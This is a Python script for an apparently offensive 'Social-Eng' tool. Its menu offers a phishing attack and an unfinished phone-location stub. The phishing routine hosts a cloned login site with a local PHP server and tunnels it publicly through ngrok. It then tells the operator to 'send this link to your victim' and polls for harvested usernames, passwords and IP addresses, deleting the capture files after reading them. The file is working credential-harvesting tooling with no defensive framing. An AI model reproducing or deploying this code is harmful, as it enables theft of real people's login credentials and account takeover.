#!/bin/usr/python3
# -*- coding: utf-8 -*-
import os
import subprocess
import re
import atexit
import time


class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

def Options():
	print ("\n")
	print (bcolors.GREEN+"[1]"+bcolors.ENDC+bcolors.RED+" Phishing attack"+bcolors.ENDC)
	print (bcolors.GREEN+"[2]"+bcolors.ENDC+bcolors.RED+" Locate Phones"+bcolors.ENDC)
	print ("\n")

	option = input(bcolors.GREEN+"[Social-Eng]"+bcolors.ENDC+bcolors.RED+"Panic"+bcolors.ENDC+bcolors.WHITE+":"+bcolors.ENDC+bcolors.BLUE+"~/ "+bcolors.ENDC)
	if(option == "1"):
		Phishing()
	elif(option == "2"):
		LocatePhone()
	else:
		print (bcolors.RED+"\nthis option is not valid!"+bcolors.ENDC)

def Phishing():
	print ("\n")
	print ("\n["+bcolors.GREEN+"+"+bcolors.ENDC+"] "+bcolors.GREEN+"Select any attack"+bcolors.ENDC)
	print ("")
	current_path = subprocess.getoutput("pwd")
	sites_path = current_path+"/Functions"+"/Sites/"
	dir_list = os.listdir(sites_path)
	site_list = []
	count = 0

	for dirs in dir_list:
		site_list.append(bcolors.RED+"["+str(count)+"] "+bcolors.ENDC+ dirs)
		count += 1

	for a,b,c in zip(site_list[::3],site_list[1::3],site_list[2::3]):
		print ('{:<30}{:<30}{:<}'.format(a,b,c))

	option = input("\n"+bcolors.GREEN+"[?] Choose an option: "+bcolors.ENDC)
	#href = input ("\n"+bcolors.GREEN+"[?] : "+bcolors.ENDC)
	option = site_list[int(option)]
	option = option[option.find("] ")+1:]

	site_ansi = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
	site = site_ansi.sub('', option.replace(" ",""))

	sites_path = sites_path + site

	subprocess.call('cd ' + sites_path + ' && php -S 127.0.0.1:3333 > /dev/null 2>&1 & ', shell=True)
	print ("\n["+bcolors.GREEN+"✓"+bcolors.ENDC+"] "+"Service PHP active")
	time.sleep(1)
	subprocess.call('./ngrok http 3333 > /dev/null 2>&1 &',shell=True)
	print ("["+bcolors.GREEN+"✓"+bcolors.ENDC+"] "+"Service Ngrok active")
	time.sleep(1)

	url = subprocess.getoutput('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
	time.sleep(2)
	print ("["+bcolors.GREEN+"!"+bcolors.ENDC+"] "+ bcolors.GREEN+"Send this link to your victim: "+bcolors.ENDC+url)
	time.sleep(2)

	print ("\n["+bcolors.GREEN+"+"+bcolors.ENDC+"] "+bcolors.GREEN+"Waiting for a victim..."+bcolors.ENDC)
	try:

		while True:
			data = Catch_credentials(sites_path)
			if (data != None):

				ip = data.get("ip")
				username = data.get("user")
				password = data.get("password")
			
				print ("["+bcolors.GREEN+"+"+bcolors.ENDC+"] "+bcolors.GREEN+bcolors.BOLD+"IP: "+bcolors.ENDC+ip)
				print ("["+bcolors.GREEN+"+"+bcolors.ENDC+"] "+bcolors.GREEN+bcolors.BOLD+"Username: "+bcolors.ENDC+username)
				print ("["+bcolors.GREEN+"+"+bcolors.ENDC+"] "+bcolors.GREEN+bcolors.BOLD+"Password: "+bcolors.ENDC+password)


	except KeyboardInterrupt:
		Close()
	
def Catch_credentials(path):
	file_exist = os.path.exists(path+"/usernames.txt")
	file_ip_exist = os.path.exists(path+"/ip.txt")
	ip = ""

	if(file_exist == True):
		print ("\n["+bcolors.GREEN+"!"+bcolors.ENDC+"] "+bcolors.YELLOW+"Credentials Found!"+bcolors.ENDC+"\n")

		file = subprocess.getoutput('cat '+path+'/usernames.txt')

		if(file_ip_exist):

			file_ip = subprocess.getoutput('cat '+path+'/ip.txt')
			ip = re.search(r'IP:(.*)', file_ip).group(1).replace(" ", "")

		user = re.search(r'EMAIL]:(.*)', file).group(1).split("[",1)[0].replace(" ", "")
		passw = re.search(r'PASS]:(.*)', file).group(1).replace(" ", "")
		data = {'ip':ip ,'user':user,'password':passw}

		os.system("rm "+path+"/usernames.txt")
		os.system("rm "+path+"/ip.txt")

		time.sleep(2)
		return data


def Close():
	print (bcolors.RED+"\nStopping services, please wait ..."+bcolors.ENDC)

	os.system("killall -2 php > /dev/null 2>&1")
	os.system("pkill -f -2 php > /dev/null 2>&1")
	print ("\n["+bcolors.RED+"✘"+bcolors.ENDC+"] "+"Service PHP inactive")
	time.sleep(1)

	os.system("pkill -f -2 ngrok > /dev/null 2>&1")
	os.system("killall -2 ngrok > /dev/null 2>&1")
	print ("["+bcolors.RED+"✘"+bcolors.ENDC+"] "+"Service Ngrok inactive\n")
	time.sleep(1)



def LocatePhone():
	print ("hello locate")

